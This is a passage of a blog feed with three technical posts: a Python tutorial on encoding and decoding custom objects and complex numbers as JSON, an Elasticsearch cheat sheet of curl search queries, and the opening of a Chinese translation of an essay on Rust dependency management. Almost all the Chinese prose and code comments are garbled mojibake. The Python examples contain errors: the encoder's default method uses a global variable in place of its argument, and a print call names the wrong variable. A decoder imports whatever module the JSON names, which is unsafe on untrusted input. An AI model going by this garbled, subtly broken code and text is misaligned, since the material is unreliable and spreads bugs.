class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> TypeError(<span class="string">f&quot;Object of type &#x27;<span class="subst">&#123;z.__class__.__name__&#125;</span>&#x27; is not JSON serializable&quot;</span>)</span><br><span class="line"></span><br><span class="line">z = <span class="number">5</span> + <span class="number">9j</span></span><br><span class="line">zJSON = json.dumps(z, default=encode_complex)</span><br><span class="line"><span class="built_in">print</span>(zJSON)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;complex&quot;</span>: true, <span class="string">&quot;real&quot;</span>: <span class="number">5.0</span>, <span class="string">&quot;imag&quot;</span>: <span class="number">9.0</span>&#125;</span><br></pre></td></tr></table></figure><p>ä½ è¿˜å¯ä»¥åˆ›å»ºä¸€ä¸ªè‡ªå®šä¹‰çš„ Encoder ç±»ï¼Œå¹¶è¦†ç›– <code>default()</code> æ–¹æ³•ã€‚ å°†å…¶ç”¨äº <code>json.dump()</code> æ–¹æ³•ä¸­çš„ <code>cls</code> å‚æ•°ï¼Œæˆ–ç›´æ¥ä½¿ç”¨ç¼–ç å™¨ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> json <span class="keyword">import</span> JSONEncoder</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ComplexEncoder</span>(<span class="title class_ inherited__">JSONEncoder</span>):</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">default</span>(<span class="params">self, o</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(z, <span class="built_in">complex</span>):</span><br><span class="line">            <span class="keyword">return</span> &#123;z.__class__.__name__: <span class="literal">True</span>, <span class="string">&quot;real&quot;</span>:z.real, <span class="string">&quot;imag&quot;</span>:z.imag&#125;</span><br><span class="line">        <span class="comment"># è®©åŸºç±»çš„é»˜è®¤æ–¹æ³•å¤„ç†å…¶ä»–å¯¹è±¡æˆ–å¼•å‘TypeError</span></span><br><span class="line">        <span class="keyword">return</span> JSONEncoder.default(self, o)</span><br><span class="line">    </span><br><span class="line">z = <span class="number">5</span> + <span class="number">9j</span></span><br><span class="line">zJSON = json.dumps(z, cls=ComplexEncoder)</span><br><span class="line"><span class="built_in">print</span>(zJSON)</span><br><span class="line"><span class="comment"># æˆ–è€…ç›´æ¥ä½¿ç”¨ç¼–ç å™¨</span></span><br><span class="line">zJson = ComplexEncoder().encode(z)</span><br><span class="line"><span class="built_in">print</span>(zJSON)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;complex&quot;</span>: true, <span class="string">&quot;real&quot;</span>: <span class="number">5.0</span>, <span class="string">&quot;imag&quot;</span>: <span class="number">9.0</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;complex&quot;</span>: true, <span class="string">&quot;real&quot;</span>: <span class="number">5.0</span>, <span class="string">&quot;imag&quot;</span>: <span class="number">9.0</span>&#125;</span><br></pre></td></tr></table></figure><h3><span id="jie-ma">è§£ç </span></h3><p>å¯ä»¥ä½¿ç”¨é»˜è®¤ JSONDecoder è§£ç è‡ªå®šä¹‰å¯¹è±¡ï¼Œä½†æ˜¯å®ƒå°†è¢«è§£ç ä¸ºå­—å…¸ã€‚ ç¼–å†™ä¸€ä¸ªè‡ªå®šä¹‰è§£ç å‡½æ•°ï¼Œè¯¥å‡½æ•°å°†ä»¥å­—å…¸ä½œä¸ºè¾“å…¥ï¼Œå¹¶åœ¨å¯ä»¥åœ¨å­—å…¸ä¸­æ‰¾åˆ°å¯¹è±¡ç±»åç§°çš„æƒ…å†µä¸‹åˆ›å»ºè‡ªå®šä¹‰å¯¹è±¡ã€‚ å°†æ­¤å‡½æ•°ç”¨äº <code>json.load()</code> æ–¹æ³•ä¸­çš„ <code>object_hook</code> å‚æ•°ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å¯èƒ½ä½†è§£ç ä¸ºå­—å…¸</span></span><br><span class="line">z = json.loads(zJSON)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(z))</span><br><span class="line"><span class="built_in">print</span>(z)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_complex</span>(<span class="params">dct</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">complex</span>.__name__ <span class="keyword">in</span> dct:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">complex</span>(dct[<span class="string">&quot;real&quot;</span>], dct[<span class="string">&quot;imag&quot;</span>])</span><br><span class="line">    <span class="keyword">return</span> dct</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç°åœ¨ï¼Œå¯¹è±¡åœ¨è§£ç åçš„ç±»å‹ä¸ºcomplex</span></span><br><span class="line">z = json.loads(zJSON, object_hook=decode_complex)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(z))</span><br><span class="line"><span class="built_in">print</span>(z)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;dict&#x27;</span>&gt;</span><br><span class="line">&#123;<span class="string">&#x27;complex&#x27;</span>: <span class="literal">True</span>, <span class="string">&#x27;real&#x27;</span>: <span class="number">5.0</span>, <span class="string">&#x27;imag&#x27;</span>: <span class="number">9.0</span>&#125;</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;complex&#x27;</span>&gt;</span><br><span class="line">(<span class="number">5</span>+<span class="number">9j</span>)</span><br></pre></td></tr></table></figure><h2><span id="mo-ban-bian-ma-he-jie-ma-han-shu">æ¨¡æ¿ç¼–ç å’Œè§£ç å‡½æ•°</span></h2><p>å¦‚æœåœ¨ <code>__init__</code> æ–¹æ³•ä¸­æä¾›äº†æ‰€æœ‰ç±»å˜é‡ï¼Œåˆ™æ­¤æ–¹æ³•é€‚ç”¨äºæ‰€æœ‰è‡ªå®šä¹‰ç±»ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>:</span><br><span class="line"><span class="comment"># è‡ªå®šä¹‰ç±»åœ¨ __init__() ä¸­åŒ…å«æ‰€æœ‰ç±»å˜é‡</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age, active, balance, friends</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line">        self.active = active</span><br><span class="line">        self.balance = balance</span><br><span class="line">        self.friends = friends</span><br><span class="line">        </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Player</span>:</span><br><span class="line">    <span class="comment"># å…¶ä»–è‡ªå®šä¹‰ç±»</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, nickname, level</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.nickname = nickname</span><br><span class="line">        self.level = level</span><br><span class="line">          </span><br><span class="line">            </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_obj</span>(<span class="params">obj</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    æ¥å—ä¸€ä¸ªè‡ªå®šä¹‰å¯¹è±¡ï¼Œå¹¶è¿”å›è¯¥å¯¹è±¡çš„å­—å…¸è¡¨ç¤ºå½¢å¼ã€‚ æ­¤å­—å…¸è¡¨ç¤ºå½¢å¼è¿˜åŒ…æ‹¬å¯¹è±¡çš„æ¨¡å—å’Œç±»åç§°ã€‚</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># ç”¨å¯¹è±¡å…ƒæ•°æ®å¡«å……å­—å…¸</span></span><br><span class="line">    obj_dict = &#123;</span><br><span class="line">      <span class="string">&quot;__class__&quot;</span>: obj.__class__.__name__,</span><br><span class="line">      <span class="string">&quot;__module__&quot;</span>: obj.__module__</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="comment"># ç”¨å¯¹è±¡å±æ€§å¡«å……å­—å…¸</span></span><br><span class="line">    obj_dict.update(obj.__dict__)</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> obj_dict</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_dct</span>(<span class="params">dct</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    æ¥å—å­—å…¸å¹¶è¿”å›ä¸è¯¥å­—å…¸å…³è”çš„è‡ªå®šä¹‰å¯¹è±¡ã€‚</span></span><br><span class="line"><span class="string">    å®ƒåˆ©ç”¨å­—å…¸ä¸­çš„ &quot;__module__&quot; å’Œ &quot;__class__&quot; å…ƒæ•°æ®æ¥äº†è§£è¦åˆ›å»ºçš„å¯¹è±¡ç±»å‹ã€‚</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;__class__&quot;</span> <span class="keyword">in</span> dct:</span><br><span class="line">        <span class="comment"># Pop ensures we remove metadata from the dict to leave only the instance arguments</span></span><br><span class="line">        class_name = dct.pop(<span class="string">&quot;__class__&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Get the module name from the dict and import it</span></span><br><span class="line">        module_name = dct.pop(<span class="string">&quot;__module__&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># We use the built in __import__ function since the module name is not yet known at runtime</span></span><br><span class="line">        module = <span class="built_in">__import__</span>(module_name)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Get the class from the module</span></span><br><span class="line">        class_ = <span class="built_in">getattr</span>(module,class_name)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Use dictionary unpacking to initialize the object</span></span><br><span class="line">        <span class="comment"># Note: This only works if all __init__() arguments of the class are exactly the dict keys</span></span><br><span class="line">        obj = class_(**dct)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        obj = dct</span><br><span class="line">    <span class="keyword">return</span> obj</span><br><span class="line"></span><br><span class="line"><span class="comment"># User ç±»é€‚ç”¨äºæˆ‘ä»¬çš„ç¼–ç å’Œè§£ç æ–¹æ³•</span></span><br><span class="line">user = User(name = <span class="string">&quot;John&quot;</span>,age = <span class="number">28</span>, friends = [<span class="string">&quot;Jane&quot;</span>, <span class="string">&quot;Tom&quot;</span>], balance = <span class="number">20.70</span>, active = <span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">userJSON = json.dumps(user,default=encode_obj,indent=<span class="number">4</span>, sort_keys=<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(userJSON)</span><br><span class="line"></span><br><span class="line">user_decoded = json.loads(userJSON, object_hook=decode_dct)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(user_decoded))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Player ç±»ä¹Ÿé€‚ç”¨äºæˆ‘ä»¬çš„ç¼–ç å’Œè§£ç æ–¹æ³•</span></span><br><span class="line">player = Player(<span class="string">&#x27;Max&#x27;</span>, <span class="string">&#x27;max1234&#x27;</span>, <span class="number">5</span>)</span><br><span class="line">playerJSON = json.dumps(player,default=encode_obj,indent=<span class="number">4</span>, sort_keys=<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(playerJSON)</span><br><span class="line"></span><br><span class="line">player_decoded = json.loads(playerJSON, object_hook=decode_dct)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(player_decoded))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;__class__&quot;</span>: <span class="string">&quot;User&quot;</span>,</span><br><span class="line">    <span class="string">&quot;__module__&quot;</span>: <span class="string">&quot;__main__&quot;</span>,</span><br><span class="line">    <span class="string">&quot;active&quot;</span>: true,</span><br><span class="line">    <span class="string">&quot;age&quot;</span>: <span class="number">28</span>,</span><br><span class="line">    <span class="string">&quot;balance&quot;</span>: <span class="number">20.7</span>,</span><br><span class="line">    <span class="string">&quot;friends&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;Jane&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Tom&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;John&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;__main__.User&#x27;</span>&gt;</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;__class__&quot;</span>: <span class="string">&quot;Player&quot;</span>,</span><br><span class="line">    <span class="string">&quot;__module__&quot;</span>: <span class="string">&quot;__main__&quot;</span>,</span><br><span class="line">    <span class="string">&quot;level&quot;</span>: <span class="number">5</span>,</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Max&quot;</span>,</span><br><span class="line">    <span class="string">&quot;nickname&quot;</span>: <span class="string">&quot;max1234&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;__main__.Player&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      11. JSON â€” Python è¿›é˜¶
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="Python" scheme="https://qiwihui.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Elasticsearch cheat sheet</title>
    <link href="https://qiwihui.com/qiwihui-blog-39/"/>
    <id>https://qiwihui.com/qiwihui-blog-39/</id>
    <published>2022-08-13T01:54:25.550Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="1">1</span></h3><p><code>curl -X&lt;REST Verb&gt; &lt;Node&gt;:&lt;Port&gt;/&lt;Index&gt;/&lt;Type&gt;/&lt;ID&gt;</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -XPOST &#x27;localhost:9200/bank/_search?pretty&#x27; -d &#x27;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;: &#123; &quot;match_all&quot;: &#123;&#125; &#125;,</span><br><span class="line">  &quot;_source&quot;: [&quot;account_number&quot;, &quot;balance&quot;],</span><br><span class="line">  &quot;sort&quot;: &#123; &quot;balance&quot;: &#123; &quot;order&quot;: &quot;desc&quot; &#125; &#125;</span><br><span class="line">&#125;&#x27;</span><br></pre></td></tr></table></figure><p><code>bool must</code>: æ‰€æœ‰çš„æŸ¥è¯¢éƒ½å¿…é¡»ä¸ºçœŸ<code>bool should</code>: åªè¦æœ‰ä¸€ä¸ªæŸ¥è¯¢åŒ¹é…<code>bool must_not</code>: æŸ¥è¯¢åˆ—è¡¨ä¸­çš„çš„æ‰€æœ‰æŸ¥è¯¢éƒ½å¿…é¡»éƒ½ä¸ä¸ºçœŸ</p><h3><span id="2-zhi-xing-guo-lu-qi">2. æ‰§è¡Œè¿‡æ»¤å™¨</span></h3><p><code>_score</code>: æŒ‡å®šçš„æœç´¢æŸ¥è¯¢åŒ¹é…ç¨‹åº¦çš„ä¸€ä¸ªç›¸å¯¹åº¦é‡ã€‚å¾—åˆ†è¶Šé«˜ï¼Œæ–‡æ¡£è¶Šç›¸å…³ï¼Œå¾—åˆ†è¶Šä½æ–‡æ¡£çš„ç›¸å…³åº¦è¶Šä½ã€‚Elasticsearchä¸­çš„æ‰€æœ‰çš„æŸ¥è¯¢éƒ½ä¼šè§¦å‘ç›¸å…³åº¦å¾—åˆ†çš„è®¡ç®—ã€‚å¯¹äºé‚£äº›æˆ‘ä»¬ä¸éœ€è¦ç›¸å…³åº¦å¾—åˆ†çš„åœºæ™¯ä¸‹ï¼ŒElasticsearchä»¥è¿‡æ»¤å™¨çš„å½¢å¼æä¾›äº†å¦ä¸€ç§æŸ¥è¯¢åŠŸèƒ½ã€‚</p><p>è¿‡æ»¤å™¨åœ¨æ¦‚å¿µä¸Šç±»ä¼¼äºæŸ¥è¯¢ï¼Œä½†æ˜¯å®ƒä»¬æœ‰éå¸¸å¿«çš„æ‰§è¡Œé€Ÿåº¦ï¼Œè¿™ç§å¿«çš„æ‰§è¡Œé€Ÿåº¦ä¸»è¦æœ‰ä»¥ä¸‹ä¸¤ä¸ªåŸå› ï¼š</p><ul><li>è¿‡æ»¤å™¨ä¸ä¼šè®¡ç®—ç›¸å…³åº¦çš„å¾—åˆ†ï¼Œæ‰€ä»¥å®ƒä»¬åœ¨è®¡ç®—ä¸Šæ›´å¿«ä¸€äº›</li><li>è¿‡æ»¤å™¨å¯ä»¥è¢«ç¼“å­˜åˆ°å†…å­˜ä¸­ï¼Œè¿™ä½¿å¾—åœ¨é‡å¤çš„æœç´¢æŸ¥è¯¢ä¸Šï¼Œå…¶è¦æ¯”ç›¸åº”çš„æŸ¥è¯¢å¿«å‡ºè®¸å¤šã€‚</li></ul><p>é€šå¸¸æƒ…å†µä¸‹ï¼Œè¦å†³å®šæ˜¯ä½¿ç”¨è¿‡æ»¤å™¨è¿˜æ˜¯ä½¿ç”¨æŸ¥è¯¢ï¼Œä½ å°±éœ€è¦é—®è‡ªå·±æ˜¯å¦éœ€è¦ç›¸å…³åº¦å¾—åˆ†ã€‚å¦‚æœç›¸å…³åº¦æ˜¯ä¸é‡è¦çš„ï¼Œä½¿ç”¨è¿‡æ»¤å™¨ï¼Œå¦åˆ™ä½¿ç”¨æŸ¥è¯¢ã€‚</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -XPOST <span class="string">&#x27;localhost:9200/bank/_search?pretty&#x27;</span> -d <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">  &quot;query&quot;: &#123;</span></span><br><span class="line"><span class="string">    &quot;filtered&quot;: &#123;</span></span><br><span class="line"><span class="string">      &quot;query&quot;: &#123; &quot;match_all&quot;: &#123;&#125; &#125;,</span></span><br><span class="line"><span class="string">      &quot;filter&quot;: &#123;</span></span><br><span class="line"><span class="string">        &quot;range&quot;: &#123;</span></span><br><span class="line"><span class="string">          &quot;balance&quot;: &#123;</span></span><br><span class="line"><span class="string">            &quot;gte&quot;: 20000,</span></span><br><span class="line"><span class="string">            &quot;lte&quot;: 30000</span></span><br><span class="line"><span class="string">          &#125;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h3><span id="3">3</span></h3><p>doc[â€˜my_fieldâ€™].valueå’Œ_source.my_fieldä¹‹é—´çš„ä¸åŒ:</p><ul><li>é¦–å…ˆï¼Œä½¿ç”¨docå…³é”®å­—ï¼Œä¼šä½¿ç›¸åº”çš„å­—æ®µåŠ è½½åˆ°å†…å­˜ï¼Œæ‰§è¡Œé€Ÿåº¦æ›´å¿«ä½†æ˜¯æ›´è€—è´¹å†…å­˜ï¼›</li><li>ç¬¬äºŒï¼Œdoc[â€¦]ç¬¦å· ä»…å…è®¸ç®€å•çš„å€¼å­—æ®µï¼Œåªåœ¨åŸºäºå­—æ®µçš„éåˆ†ææˆ–è€…å•ä¸ªé¡¹ä¸Šæœ‰æ„ä¹‰ï¼›</li><li>_sourceåŠ è½½ã€åˆ†æsourceï¼Œç„¶åä»…ä»…è¿”å›ç›¸å…³éƒ¨åˆ†çš„jsonã€‚</li></ul><h3><span id="can-kao">å‚è€ƒ</span></h3><ul><li><a href="https://endymecy.gitbooks.io/elasticsearch-guide-chinese/">elasticsearch guide chinese</a></li><li><a href="https://gist.github.com/ruanbekker/e8a09604b14f37e8d2f743a87b930f93">https://gist.github.com/ruanbekker/e8a09604b14f37e8d2f743a87b930f93</a></li><li><a href="https://gist.github.com/stephen-puiszis/212b8a8b37f67c670422">https://gist.github.com/stephen-puiszis/212b8a8b37f67c670422</a></li></ul><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      Elasticsearch cheat sheet
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>Rustå¦‚ä½•è§£å†³ä¾èµ–åœ°ç‹±</title>
    <link href="https://qiwihui.com/qiwihui-blog-68/"/>
    <id>https://qiwihui.com/qiwihui-blog-68/</id>
    <published>2022-08-13T01:54:25.550Z</published>
    <updated>2024-05-15T02:25:31.470Z</updated>
    
    <content type="html"><![CDATA[<p>åŸæ–‡ï¼š<a href="https://stephencoakley.com/2019/04/24/how-rust-solved-dependency-hell">How Rust Solved Dependency Hell</a></p><p>æ¯éš”ä¸€æ®µæ—¶é—´æˆ‘å°±ä¼šå‚ä¸ä¸€ä¸ªå…³äºä¾èµ–ç®¡ç†å’Œç‰ˆæœ¬çš„å¯¹è¯ï¼Œé€šå¸¸æ˜¯åœ¨å·¥ä½œä¸­ï¼Œå…¶ä¸­ä¼šå‡ºç°â€œä¾èµ–åœ°ç‹±â€çš„ä¸»é¢˜ã€‚å¦‚æœä½ å¯¹è¿™ä¸ªæœ¯è¯­ä¸ç†Ÿæ‚‰ï¼Œé‚£ä¹ˆæˆ‘å»ºè®®ä½ æŸ¥ä¸€ä¸‹ã€‚ç®€è¦æ€»ç»“å¯èƒ½æ˜¯ï¼šâ€œå¤„ç†åº”ç”¨ç¨‹åºä¾èµ–ç‰ˆæœ¬å’Œä¾èµ–å†²çªæ‰€å¸¦æ¥çš„æŒ«è´¥æ„Ÿâ€ã€‚å¸¦ç€è¿™ä¸ªï¼Œè®©æˆ‘ä»¬å…ˆè·å¾—å…³äºä¾èµ–è§£æçš„ä¸€äº›æŠ€æœ¯ã€‚</p><h2><span id="wen-ti">é—®é¢˜</span></h2><p>åœ¨è®¨è®ºåŒ…åº”è¯¥å…·æœ‰å“ªç§ä¾èµ–å…³ç³»ä»¥åŠå“ªäº›ä¾èµ–å…³ç³»å¯èƒ½å¯¼è‡´é—®é¢˜æ—¶ï¼Œæœ¬ä¸»é¢˜é€šå¸¸ä¼šè¿›å…¥è®¨è®ºã€‚ä½œä¸ºä¸€ä¸ªçœŸå®çš„ä¾‹å­ï¼Œåœ¨ <a href="https://www.widen.com/">Widen Enterprises</a>ï¼Œæˆ‘ä»¬æœ‰ä¸€ä¸ªå†…éƒ¨çš„ï¼Œå¯é‡ç”¨çš„Javaæ¡†æ¶ï¼Œå®ƒç”±å‡ ä¸ªè½¯ä»¶åŒ…ç»„æˆï¼Œä¸ºæˆ‘ä»¬æä¾›äº†åˆ›å»ºè®¸å¤šå†…éƒ¨æœåŠ¡çš„åŸºç¡€ï¼ˆå¦‚æœä½ æ„¿æ„çš„è¯ï¼Œå¾®æœåŠ¡ï¼‰ã€‚è¿™å¾ˆå¥½ï¼Œä½†æ˜¯å¦‚æœä½ æƒ³åˆ›å»ºä¸€ä¸ªä¾èµ–äºæ¡†æ¶ä¸­æŸäº›ä¸œè¥¿çš„å¯é‡ç”¨å…±äº«ä»£ç åº“å‘¢ï¼Ÿå¦‚æœä½ å°è¯•åœ¨åº”ç”¨ç¨‹åºä¸­ä½¿ç”¨è¿™æ ·çš„åº“ï¼Œæœ€ç»ˆå¯èƒ½ä¼šå¾—åˆ°å¦‚ä¸‹ä¾èµ–å…³ç³»å›¾ï¼š</p><span id="more"></span><p><img src="https://user-images.githubusercontent.com/3297411/56954726-11c3d000-6b72-11e9-92e6-ee00b3551bfd.png" alt="first"></p><p>å°±åƒåœ¨è¿™ä¸ªä¾‹å­ä¸­ä¸€æ ·ï¼Œæ¯å½“ä½ è¯•å›¾åœ¨æœåŠ¡ä¸­ä½¿ç”¨åº“æ—¶ï¼Œä½ çš„æœåŠ¡å’Œåº“å¾ˆå¯èƒ½ä¾èµ–äºä¸åŒç‰ˆæœ¬çš„æ¡†æ¶ï¼Œè¿™å°±æ˜¯â€œä¾èµ–åœ°ç‹±â€çš„å¼€å§‹ã€‚</p><p>ç°åœ¨ï¼Œåœ¨è¿™ä¸€ç‚¹ä¸Šï¼Œä¸€ä¸ªå¥½çš„å¼€å‘å¹³å°å°†ä¸ºä½ æä¾›ä»¥ä¸‹ä¸¤ç§é€‰æ‹©çš„ç»„åˆï¼š</p><ul><li>ä½¿æ„å»ºå¤±è´¥å¹¶è­¦å‘Šæˆ‘ä»¬<code>framework</code>ç‰ˆæœ¬<code>21.1.1</code>å’Œ<code>21.2.0</code>ç›¸äº’å†²çªã€‚</li><li>ä½¿ç”¨<a href="https://semver.org/">è¯­ä¹‰ç‰ˆæœ¬æ§åˆ¶</a>å…è®¸åŒ…å®šä¹‰ä¸å…¶å…¼å®¹çš„ <em>ä¸€ç³»åˆ—</em> ç‰ˆæœ¬ã€‚å¦‚æœå¹¸è¿çš„è¯ï¼Œä¸¤ä¸ªè½¯ä»¶åŒ…éƒ½å…¼å®¹çš„ç‰ˆæœ¬é›†æ˜¯éç©ºçš„ï¼Œä½ æœ€ç»ˆå¯ä»¥åœ¨åº”ç”¨ç¨‹åºä¸­è‡ªåŠ¨ä½¿ç”¨å…¶ä¸­ä¸€ä¸ªç‰ˆæœ¬ã€‚</li></ul><p>è¿™ä¸¤ä¸ªçœ‹èµ·æ¥éƒ½åˆç†ï¼Œå¯¹å§ï¼Ÿå¦‚æœä¸¤ä¸ªè½¯ä»¶åŒ…ç¡®å®å½¼æ­¤ä¸å…¼å®¹ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ ¹æœ¬æ— æ³•åœ¨ä¸ä¿®æ”¹å…¶ä¸­ä¸€ä¸ªçš„æƒ…å†µä¸‹å°†å®ƒä»¬ä¸€èµ·ä½¿ç”¨ã€‚è¿™æ˜¯ä¸€ä¸ªè‰°éš¾çš„æƒ…å†µï¼Œä½†æ›¿ä»£æ–¹æ¡ˆå¾€å¾€æ›´ç³Ÿç³•ã€‚äº‹å®ä¸Šï¼ŒJavaæ˜¯<em>ä¸è¯¥</em>å­¦ä¹ çš„ä¸€ä¸ªå¾ˆå¥½çš„ä¾‹å­ï¼š</p><ul><li>é»˜è®¤è¡Œä¸ºæ˜¯å…è®¸å°†ä¾èµ–é¡¹çš„å¤šä¸ªç‰ˆæœ¬æ·»åŠ åˆ°ç±»è·¯å¾„ï¼ˆJavaçš„å®šä½ç±»çš„æ–¹å¼ï¼‰ã€‚å½“åº”ç”¨ç¨‹åºéœ€è¦åº“ä¸­çš„ç±»æ—¶ï¼Œå®é™…ä½¿ç”¨å“ªä¸ªç‰ˆæœ¬ï¼Ÿåœ¨å®è·µä¸­ï¼Œç±»çš„åŠ è½½é¡ºåºå› ç¯å¢ƒè€Œå¼‚ï¼Œç”šè‡³ä»¥éç¡®å®šçš„æ–¹å¼è¿è¡Œï¼Œå› æ­¤ä½ å®é™…ä¸Šä¸çŸ¥é“å°†ä½¿ç”¨å“ªä¸€ä¸ªã€‚å“å‘€ï¼</li><li>æˆ‘ä»¬åœ¨Widenä½¿ç”¨çš„å¦ä¸€ä¸ªé€‰æ‹©æ˜¯<em>å¼ºåˆ¶ç‰ˆæœ¬å¯¹é½</em>ã€‚è¿™ç±»ä¼¼äºä¹‹å‰çš„ç¬¬äºŒä¸ªåˆç†é€‰æ‹©ï¼Œåœ¨Javaä¸­ï¼Œä¾èµ–å…³ç³»æ— æ³•è¡¨è¾¾å…¼å®¹æ€§èŒƒå›´ï¼Œå› æ­¤æˆ‘ä»¬åªé€‰æ‹©è¾ƒæ–°çš„å¯èƒ½ä¾èµ–é¡¹å¹¶ç¥ˆç¥·å®ƒä»ç„¶æœ‰æ•ˆã€‚åœ¨å‰é¢æ˜¾ç¤ºçš„ä¾èµ–å…³ç³»å›¾ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬å°†å¼ºåˆ¶<code>app</code>å‡çº§åˆ°<code>framework 21.2.0</code>ã€‚</li></ul><p>è¿™çœ‹èµ·æ¥åƒæ˜¯ä¸€ä¸ªåŒè¾“çš„æƒ…å†µï¼Œæ‰€ä»¥ä½ å¯ä»¥æƒ³è±¡ï¼Œè¿™å¯¹æ·»åŠ ä¾èµ–é¡¹éå¸¸ä¸åˆ©ï¼Œå¹¶ä¸”ä½¿ä¹‹æˆä¸ºä¸€ä¸ªäº‹å®ä¸Šçš„ç­–ç•¥ï¼Œé™¤äº†å®é™…çš„åº”ç”¨ç¨‹åºä¹‹å¤–ä»€ä¹ˆéƒ½ä¸å…è®¸ä¾èµ–æˆ‘ä»¬çš„æ ¸å¿ƒæ¡†æ¶ã€‚</p><h2><span 